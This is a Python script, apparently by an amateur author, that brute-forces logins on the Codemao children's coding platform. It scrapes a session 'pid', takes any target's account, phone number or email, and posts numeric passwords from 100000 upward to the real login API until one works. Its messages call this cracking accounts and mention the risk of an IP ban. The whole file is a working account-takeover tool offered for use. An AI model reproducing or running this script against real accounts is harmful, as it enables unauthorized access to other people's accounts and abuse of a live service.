'''
pid获取程序来自未入门的程序员(2529119)
作者：蕉饼(921441)
'''
from bs4 import BeautifulSoup
import json, requests, sys, time
from json import dumps
headers={"Content-Type":"application/json",'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'}
startTime = time.time()
print('尝试连接编程猫服务器...')
try:
    requests.get('https://shequ.codemao.cn')
except:
    print('连接失败，请检测网络连接。如果已连接网络，请联系蕉饼(QQ:2451286214 或邮箱:qbrbcc@163.com)')
    sys.exit()

print('我们在' + str(int((time.time() - startTime) * 100)/100) + '秒内成功连接至编程猫服务器！')
startTime = time.time()
print('\n正在获取pid...')
res=requests.get('https://shequ.codemao.cn',headers=headers)
soup=BeautifulSoup(res.text,'html.parser')
data=json.loads(soup.find_all("script")[0].string.split("=")[1])
pid = data['pid']
print('我们在' + str(int((time.time() - startTime) * 100)/100) + '秒内获取pid(' + pid + ')成功！')
print('\n如果操作太频繁，可能会被编程猫官方发现，可能会被封IP(虽然不怎么可能，因为编程猫服务器非常大，历史上编程猫仅封过一个IP)\n注意：此程序只能破解密码全部是数字的账号\n不支持破解第一项是0的密码')
identity = input('\n您的编程猫账号/手机号/邮箱？')
password = 100000
print('\n\n')
startTime = time.time()
while len(str(password)) <= 20:
    message = requests.post('https://api.codemao.cn/tiger/v3/web/accounts/login',headers = headers,data = dumps({'identity':identity,'password':str(password),'pid':pid})).text
    if 'error_message' in message:
        print('密码：' + str(password) + '\n破解状态：' + json.loads(message)['error_message'] + '\n已用时：' + str(int((time.time() - startTime) * 100)/100) + '秒\n\n')
    else:
        print('破解成功，密码是：' + str(password))
        break
    password += 1
